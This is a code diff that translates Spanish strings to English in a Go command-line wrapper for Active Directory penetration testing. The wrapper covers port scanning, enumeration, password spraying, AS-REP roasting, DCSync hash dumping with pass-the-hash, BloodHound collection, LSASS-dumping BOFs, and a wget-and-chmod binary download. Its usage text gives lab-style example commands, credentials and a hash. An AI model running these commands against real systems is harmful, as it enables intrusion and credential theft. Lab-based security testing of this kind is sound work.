@@ -101,9 +101,9 @@ func (cl *CLI) cmdBofInstall() {
 		dir   string
 	}
 	repos := []repo{
-		{"BofAllTheThings (N7WEra) — aggregado compilado", "https://github.com/N7WEra/BofAllTheThings", "BofAllTheThings"},
+		{"BofAllTheThings (N7WEra) — compiled aggregate", "https://github.com/N7WEra/BofAllTheThings", "BofAllTheThings"},
 		{"Situational Awareness (TrustedSec)", "https://github.com/TrustedSec/CS-Situational-Awareness-BOF", "situational-awareness"},
-		{"nanodump (Fortra) — LSASS sin MiniDumpWriteDump", "https://github.com/fortra/nanodump", "nanodump"},
+		{"nanodump (Fortra) — LSASS without MiniDumpWriteDump", "https://github.com/fortra/nanodump", "nanodump"},
 		{"C2-Tool-Collection (Outflank)", "https://github.com/outflanknl/C2-Tool-Collection", "outflank"},
 		{"Misc BOFs (ajpc500)", "https://github.com/ajpc500/BOFs", "ajpc500"},
 	}
@@ -111,17 +111,17 @@ func (cl *CLI) cmdBofInstall() {
 	for _, r := range repos {
 		dest := filepath.Join(bofDir, r.dir)
 		if _, err := os.Stat(filepath.Join(dest, ".git")); err == nil {
-			fmt.Printf("  \033[34m[~]\033[0m %-50s actualizando\n", r.label)
+			fmt.Printf("  \033[34m[~]\033[0m %-50s updating\n", r.label)
 			cl.runLocalShell("git -C " + shellescape(dest) + " pull -q --ff-only 2>&1 | tail -1")
 		} else {
-			fmt.Printf("  \033[33m[+]\033[0m %-50s clonando\n", r.label)
+			fmt.Printf("  \033[33m[+]\033[0m %-50s cloning\n", r.label)
 			cl.runLocalShell("git clone -q --depth 1 " + shellescape(r.url) + " " + shellescape(dest) + " 2>&1")
 		}
 		// Outflank C2-Tool-Collection ships only .c sources — compile after clone/pull
 		if r.dir == "outflank" {
 			makefile := filepath.Join(dest, "BOF", "Makefile")
 			if _, err := os.Stat(makefile); err == nil {
-				fmt.Printf("  \033[33m[*]\033[0m %-50s compilando BOFs (mingw)…\n", r.label)
+				fmt.Printf("  \033[33m[*]\033[0m %-50s compiling BOFs (mingw)…\n", r.label)
 				cl.runLocalShell("make -C " + shellescape(filepath.Join(dest, "BOF")) + " 2>&1 | tail -5")
 			}
 		}
@@ -135,15 +135,15 @@ func (cl *CLI) cmdBofList() {
 	bofDir := getBofDir()
 	entries := listBofFiles(bofDir)
 	if len(entries) == 0 {
-		fmt.Printf("[!] sin BOFs en %s/  →  ejecuta: bof install\n\n", bofDir)
-		fmt.Print("uso: bof <nombre|archivo.o> [val:tipo ...]\n\n")
-		fmt.Print("tipos de argumento:\n")
-		fmt.Print("  texto:z            C string (null-terminated)\n")
-		fmt.Print("  texto:Z            wide string (UTF-16LE)\n")
+		fmt.Printf("[!] no BOFs in %s/  →  run: bof install\n\n", bofDir)
+		fmt.Print("usage: bof <name|file.o> [val:type ...]\n\n")
+		fmt.Print("argument types:\n")
+		fmt.Print("  text:z             C string (null-terminated)\n")
+		fmt.Print("  text:Z             wide string (UTF-16LE)\n")
 		fmt.Print("  42:i               int32\n")
 		fmt.Print("  256:s              int16\n")
-		fmt.Print("  /ruta/datos.bin:b  fichero binario\n\n")
-		fmt.Print("ejemplos (una vez instalados):\n")
+		fmt.Print("  /path/data.bin:b   binary file\n\n")
+		fmt.Print("examples (once installed):\n")
 		fmt.Print("  bof arp\n")
 		fmt.Print("  bof nanodump\n")
 		fmt.Print("  bof ldapsearch DC=corp,DC=com:z LDAP:z (LDAP 389):i\n")
@@ -217,7 +217,7 @@ func (cl *CLI) findTool(names ...string) string {
 func (cl *CLI) mustTool(names ...string) string {
 	p := cl.findTool(names...)
 	if p == "" {
-		fmt.Printf("[!] herramienta no encontrada: %s — ejecuta 'setup'\n", strings.Join(names, "/"))
+		fmt.Printf("[!] tool not found: %s — run 'setup'\n", strings.Join(names, "/"))
 	}
 	return p
 }
@@ -260,12 +260,12 @@ func (cl *CLI) cmdSetup() {
 		{"john",             []string{"john"},                           "apt-get install -y john"},
 	}
 
-	fmt.Println("\n── herramientas ──────────────────────────────────────────────")
+	fmt.Println("\n── tools ──────────────────────────────────────────────────────")
 	for _, t := range tools {
 		if p := cl.findTool(t.names...); p != "" {
 			fmt.Printf("  \033[32m[+]\033[0m %-25s %s\n", t.label, p)
 		} else {
-			fmt.Printf("  \033[33m[!]\033[0m %-25s instalando...\n", t.label)
+			fmt.Printf("  \033[33m[!]\033[0m %-25s installing...\n", t.label)
 			cl.runLocalShell(t.install)
 		}
 	}
@@ -274,7 +274,7 @@ func (cl *CLI) cmdSetup() {
 	if p := cl.findTool("kerbrute"); p != "" {
 		fmt.Printf("  \033[32m[+]\033[0m %-25s %s\n", "kerbrute", p)
 	} else {
-		fmt.Printf("  \033[33m[!]\033[0m %-25s descargando...\n", "kerbrute")
+		fmt.Printf("  \033[33m[!]\033[0m %-25s downloading...\n", "kerbrute")
 		cl.runLocalShell(`wget -qO /tmp/kerbrute \
   https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 \
   && chmod +x /tmp/kerbrute && echo "[+] kerbrute → /tmp/kerbrute"`)
@@ -284,12 +284,12 @@ func (cl *CLI) cmdSetup() {
 
 // ── scan ──────────────────────────────────────────────────────────────────────
 
-const scanUsage = `uso: scan <target> [-p <ports>]
+const scanUsage = `usage: scan <target> [-p <ports>]
 
-  sin -p   → TCP completo  (nmap -sS -p- --min-rate 5000 -T4)
-  con -p   → puertos dados + detección de servicios y scripts
+  without -p   → full TCP scan  (nmap -sS -p- --min-rate 5000 -T4)
+  with -p      → given ports + service/script detection
 
-ejemplos:
+examples:
   scan 10.2.20.100
   scan 10.2.20.100 -p 53,88,135,139,389,445,464,636,3268,3389,5985`
 
@@ -316,12 +316,12 @@ func (cl *CLI) cmdScan(args []string) {
 
 // ── enum ──────────────────────────────────────────────────────────────────────
 
-const enumUsage = `uso: enum <target> [-u <user>] [-p <pass>]
+const enumUsage = `usage: enum <target> [-u <user>] [-p <pass>]
 
-  sin credenciales → null/guest session (shares, pass-pol, rid-brute)
-  con credenciales → users, groups, shares, admin-count (SMB + LDAP)
+  no credentials → null/guest session (shares, pass-pol, rid-brute)
+  with credentials → users, groups, shares, admin-count (SMB + LDAP)
 
-ejemplos:
+examples:
   enum 10.2.20.100
   enum 10.2.20.100 -u 'mssql_svc$' -p shelby`
 
@@ -351,11 +351,11 @@ func (cl *CLI) cmdEnum(args []string) {
 
 // ── spray ─────────────────────────────────────────────────────────────────────
 
-const sprayUsage = `uso: spray <target> -u <userlist> -p <password>
+const sprayUsage = `usage: spray <target> -u <userlist> -p <password>
 
-  Prueba una contraseña contra todos los usuarios del fichero.
+  Tests a password against all users in the file.
 
-ejemplos:
+examples:
   spray 10.2.20.100 -u userlist.txt -p ncc1701
   spray 10.2.20.100 -u userlist.txt -p 'Changeme123!'`
 
@@ -376,14 +376,14 @@ func (cl *CLI) cmdSpray(args []string) {
 
 // ── asrep ─────────────────────────────────────────────────────────────────────
 
-const asrepUsage = `uso: asrep <target> -d <domain> -u <userlist> [-w <wordlist>]
+const asrepUsage = `usage: asrep <target> -d <domain> -u <userlist> [-w <wordlist>]
 
-  Solicita TGT sin preauth para cada usuario del fichero.
-  Si se encuentra algún hash, intenta crackearlos con john.
+  Requests TGT without preauth for each user in the file.
+  If hashes are found, attempts to crack them with john.
 
-  -w   wordlist para john  (por defecto: badpwds.txt si existe, o rockyou.txt)
+  -w   wordlist for john  (default: badpwds.txt if present, or rockyou.txt)
 
-ejemplos:
+examples:
   asrep 10.2.20.100 -d cs.org -u userlist.txt
   asrep 10.2.20.100 -d cs.org -u userlist.txt -w /usr/share/wordlists/rockyou.txt`
 
@@ -409,7 +409,7 @@ func (cl *CLI) cmdASREP(args []string) {
 
 	data, err := os.ReadFile(outFile)
 	if err != nil || len(data) == 0 {
-		fmt.Println("[!] no se obtuvieron hashes")
+		fmt.Println("[!] no hashes obtained")
 		return
 	}
 	fmt.Printf("[+] hashes → %s\n", outFile)
@@ -433,15 +433,15 @@ func (cl *CLI) cmdASREP(args []string) {
 
 // ── secretsdump ───────────────────────────────────────────────────────────────
 
-const secretsdumpUsage = `uso: secretsdump <target> -u <user> -p <pass> [-d <domain>] [-H <hash>] [-just-dc] [-local-auth]
+const secretsdumpUsage = `usage: secretsdump <target> -u <user> -p <pass> [-d <domain>] [-H <hash>] [-just-dc] [-local-auth]
 
-  Vuelca hashes del SAM/NTDS.DIT vía DCSync o SMB.
-  Cuando -d está presente agrega -just-dc automáticamente (evita bug DRSUAPI en DCs hijo).
+  Dumps hashes from SAM/NTDS.DIT via DCSync or SMB.
+  When -d is present, adds -just-dc automatically (avoids DRSUAPI bug on child DCs).
   -H          NTLM hash :NT (pass-the-hash)
-  -just-dc    fuerza solo DRSUAPI/NTDS (sin VSS/registro)
-  -local-auth autentica como cuenta local en lugar de dominio
+  -just-dc    force DRSUAPI/NTDS only (no VSS/registry)
+  -local-auth authenticate as local account instead of domain
 
-ejemplos:
+examples:
   secretsdump 10.2.20.100 -u localuser -p password
   secretsdump 10.2.20.100 -u Administrator -p password -d cs.org
   secretsdump 10.2.20.100 -u Administrator -H :8846f7eaee8fb117ad06bdd830b7586c -d cs.org`
@@ -492,12 +492,12 @@ func (cl *CLI) cmdSecretsDump(args []string) {
 
 // ── bloodhound ────────────────────────────────────────────────────────────────
 
-const bloodhoundUsage = `uso: bloodhound <target> -d <domain> -u <user> -p <pass> [-dc <fqdn>]
+const bloodhoundUsage = `usage: bloodhound <target> -d <domain> -u <user> -p <pass> [-dc <fqdn>]
 
-  Recolecta todos los objetos AD con bloodhound-python.
-  -dc   FQDN del DC (ej: WIN2022-SRV-X64.cs.org); si se omite usa el dominio.
+  Collects all AD objects with bloodhound-python.
+  -dc   DC FQDN (e.g.: WIN2022-SRV-X64.cs.org); if omitted, uses domain.
 
-ejemplos:
+examples:
   bloodhound 10.2.20.100 -d cs.org -u 'mssql_svc$' -p shelby
   bloodhound 10.2.20.100 -d cs.org -u 'mssql_svc$' -p shelby -dc WIN2022-SRV-X64.cs.org`
 
@@ -528,14 +528,14 @@ func (cl *CLI) cmdBloodHound(args []string) {
 
 // ── kerbrute ──────────────────────────────────────────────────────────────────
 
-const kerbruteUsage = `uso: kerbrute <subcommand> -d <domain> --dc <target> <wordlist> [-t <threads>]
+const kerbruteUsage = `usage: kerbrute <subcommand> -d <domain> --dc <target> <wordlist> [-t <threads>]
 
   subcommands:
-    enum   (userenum)      → enumera usuarios válidos
-    brute  (bruteuser)     → bruteforce de un usuario (-U <usuario>)
-    spray  (passwordspray) → spraying: wordlist=fichero de passwords, -U userlist
+    enum   (userenum)      → enumerate valid users
+    brute  (bruteuser)     → bruteforce a single user (-U <user>)
+    spray  (passwordspray) → spraying: wordlist=password file, -U userlist
 
-ejemplos:
+examples:
   kerbrute enum -d cs.org --dc 10.2.20.100 humans.txt
   kerbrute brute -d cs.org --dc 10.2.20.100 badpwds.txt -U mssql_svc
   kerbrute spray -d cs.org --dc 10.2.20.100 passwords.txt -U userlist.txt`
@@ -557,7 +557,7 @@ func (cl *CLI) cmdKerbrute(args []string) {
 	}
 	sub, ok := subMap[pos[0]]
 	if !ok {
-		fmt.Printf("[!] subcommand desconocido: %s\n", pos[0])
+		fmt.Printf("[!] unknown subcommand: %s\n", pos[0])
 		fmt.Println(kerbruteUsage)
 		return
 	}
